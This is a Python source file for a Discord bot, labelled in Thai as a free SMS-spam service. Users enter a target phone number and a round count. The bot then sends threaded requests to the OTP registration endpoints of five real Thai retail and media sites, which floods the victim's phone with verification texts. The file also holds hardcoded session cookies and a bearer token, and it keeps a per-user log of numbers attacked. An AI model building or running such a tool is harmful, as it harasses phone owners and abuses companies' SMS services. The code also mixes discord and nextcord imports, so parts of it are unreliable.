import os
import threading

import discord
import requests
from discord.ext import commands
from myserver import server_on

max = 10 # จำนวนสูงสุดการยิงเบอร์
admin = '1229717851091238932' 

GREEN = "\033[32m"
RED = "\033[31m"
WHITE = "\033[37m"
RESET = "\033[0m"

intents = nextcord.Intents.default()
intents.message_content = True  # Enable Message Content Intent
intents.members = True  # Optional: Enable if you need member events

bot = commands.Bot(command_prefix='!', intents=intents)

def api1(target):
    requests.post('https://api.gentlewomanonline.com/public/5e3548c2d32cb12606a34fb8/sms/otp', json={'to': target,'from': 'GENTLEWOMENT'})

def api2(target):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    }
    requests.post('https://openapi.bigc.co.th/customer/v1/otp',headers=headers,json={'phone_no': target})

def api3(target):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    }
    requests.post('https://api-sso.ch3plus.com/user/request-otp',headers=headers,json={'tel': target,'type': 'register'})

def api4(target):
    headers = {
        'accept': 'application/json, image/webp, text/javascript, */*; q=0.01',
        'cookie': 'PHPSESSID=o54sihfsl2dl294kp2qc4g8bt9; referer=https%3A%2F%2Fwww.google.com%2F; f34c_rb_banner8249=1; f34c_new_user_view_count=%7B%22count%22%3A1%2C%22expire_time%22%3A1701005014%7D; _gcl_au=1.1.492132036.1700918618; _tt_enable_cookie=1; _ttp=7x8AtckAXB_oNxekIxiQOKfUL1a; _gid=GA1.2.738305668.1700918619; _gat_UA-28072727-2=1; _ga=GA1.1.2037570943.1700918619; _ga_Z9S47GV47R=GS1.1.1700918618.1.1.1700918630.48.0.0; cto_bundle=ZGuiAV95Y1NEdnM3bjV2S3lRbndVbzNHMlM2JTJCMG14RjRWMkRXVU95V1c0TUkwa3R6ZGV3UkdMOTYlMkJQayUyQiUyQlp4SW5BeEhIQUFiTGp3OTIwcm90cFZjdWcxcCUyRmxQUVdubmJUOSUyRjE1S21oS0FhbjRYRDIlMkJIZVhUR3pSUW44cndabnlWQXFxSWFCOXEzOWU1cExuNDhXUzBuYVpaQSUzRCUzRA; _fbp=fb.1.1700918633049.813828447',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
    }
    requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={target}',headers=headers)

def api5(target):
    headers = {
        'authorization': 'Bearer c1e45c5e-82c2-464e-be08-a8049eab3bea',
        'content=type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    }
    requests.post('https://api-penguins.monline.com/graphql',headers=headers,json={"query":"\n  mutation Register (\n    $email_or_phone: String!,\n    $register_token: String,\n    $recaptcha_token: String\n  ) {\n    register(\n      input: {\n        register_token: $register_token\n        email_or_phone: $email_or_phone\n        recaptcha_token: $recaptcha_token\n      }\n    ) {\n      register_token\n      otp_ref\n    }\n  }\n","variables":{"email_or_phone":target}})


def run(phone,ammo):
  for _ in range(int(ammo)):
    threading.Thread(target=api1, args=[str(phone)]).start()
    print (f"{RED}[ + ] {GREEN}ยิงเบอร์สำเร็จ{RESET}")
    threading.Thread(target=api2, args=[str(phone)]).start()
    print (f"{RED}[ + ] {GREEN}ยิงเบอร์สำเร็จ{RESET}")
    threading.Thread(target=api3, args=[str(phone)]).start()
    print (f"{RED}[ + ] {GREEN}ยิงเบอร์สำเร็จ{RESET}")
    threading.Thread(target=api4, args=[str(phone)]).start()
    print (f"{RED}[ + ] {GREEN}ยิงเบอร์สำเร็จ{RESET}")
    threading.Thread(target=api5, args=[str(phone)]).start()
    print (f"{RED}[ + ] {GREEN}ยิงเบอร์สำเร็จ{RESET}")



class SPAM(nextcord.ui.Modal):
  def __init__(self):
    super().__init__(title='Phakaphop | ยิงเบอร์ฟรี')
    self.x = nextcord.ui.TextInput(
      label='เบอร์โทรศัพท์มือถือ',
      max_length=10,
      placeholder='xxxxxxxxxxxxxxxxxxxxxx',
      required=True
    )
    self.ammo = nextcord.ui.TextInput(
      label=f'จำนวน (สูงสุด {max})',
      placeholder='xxxxxxxxxxxxxxxxxxxxxx',
      required=True,
      max_length=5
    )
    self.add_item(self.x)
    self.add_item(self.ammo)

  async def callback(self, interaction: nextcord.Interaction):

    try:
      int(self.ammo.value)
    except ValueError:
      embed = nextcord.Embed(
        title='เกิดข้อผิดพลาด',
        description='รูปแบบขจำนวนของคุณไม่ถูกต้อง ต้องเป็นจำนวนเต็ม init เท่านั้น!',
        color=0xff0a16
      )
      return await interaction.response.send_message(embed=embed, ephemeral=True)

    if int(self.ammo.value) > int(max):
      embed = nextcord.Embed(
        title='เกิดข้อผิดพลาด',
        description=f'จำนวนต้องไม่เกิน {max} นะครับ!',
        color=0xff0a16
      )
      return await interaction.response.send_message(embed=embed, ephemeral=True)

    with open(f'{interaction.user.name}.txt', 'a+') as user:
      user.write(f'{self.x.value}\n')

    embed = nextcord.Embed(
      title='ทำรายการสำเร็จ',
      description=f'เริ่มยิงไปที่เบอร์ : {self.x.value} แล้วจำนวน {self.ammo.value} รอบ!',
      color=0xc3ed05
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)
    run(self.x.value,self.ammo.value)


class Button(nextcord.ui.View):
  def __init__(self):
    super().__init__(timeout=None)
    self.cooldown = commands.CooldownMapping.from_cooldown(1,30, commands.BucketType.member)

  @nextcord.ui.button(
    label='เริ่มยิงเบอร์',
    style=nextcord.ButtonStyle.primary,
    emoji='❗'
  )
  async def spamsms(self, button, interaction: nextcord.Interaction):
    interaction.user = interaction.user
    bucket = self.cooldown.get_bucket(interaction.message)
    retry = bucket.update_rate_limit()
    if retry:
      return await interaction.response.send_message(f'## กรุณารอ {round(retry)} วินาที', ephemeral=True)

    await interaction.response.send_modal(SPAM())

  @nextcord.ui.button(
    label='ประวัติการยิงเบอร์',
    style=nextcord.ButtonStyle.grey,
    emoji='📜'
  )
  async def check(self, button, interaction: nextcord.Interaction):
    try:
      file = open(f'{interaction.user.name}.txt', 'r').read().splitlines()
      phone = '\nเบอร์ที่ยิง : '.join(file)
      embed = nextcord.Embed(
        title='ประวัติการยิงเบอร์ของคุณ',
        description=f'\n\n```ข้อมูลทั้งหมดของคุณ\nเบอร์ที่ยิง : {phone}```',
        color=0xc3ed05
      )
      await interaction.response.send_message(embed=embed, ephemeral=True)
    except FileNotFoundError:
      embed = nextcord.Embed(
        title='ไม่สามารถเช็คประวัติได้',
        description='เนื่องจากคุณยังไม่ได้เคยยิงเบอร์ใครเลย กรุณายิงเบอร์ก่อน!',
        color=0xff0a16
      )
      await interaction.response.send_message(embed=embed, ephemeral=True)




@bot.event
async def on_ready():
  bot.add_view(Button())
  print(f"{RED} {bot.user} {GREEN}กําลังทํางาน !!!{RESET}")



# คำสั่งแสดงยิงเบอร์ !attack
@bot.command(pass_context = True)
async def attack(interaction: nextcord.Interaction):
  admin_role = nextcord.utils.get(interaction.guild.roles, name='ADMIN')
  if admin_role in interaction.author.roles:
    embed = nextcord.Embed(
      title='BOT SPAM SMS FREE',
      description='```[+] กดปุ่มเพื่อยิงเบอร์ฟรี \n[+] สามารถเช็คประวัติการยิงได้```',
      color=0xc3ed05
    )
    embed.set_image(url='https://media.discordapp.net/attachments/1182839753264070676/1183338724042485770/Bongo_Cat_Phonix_GIF_-_Bongo_Cat_Phonix_-_Discover__Share_GIFs.gif')
    await interaction.send(embed=embed, view=Button())

server_on()

bot.run(os.getenv('TOKEN'))
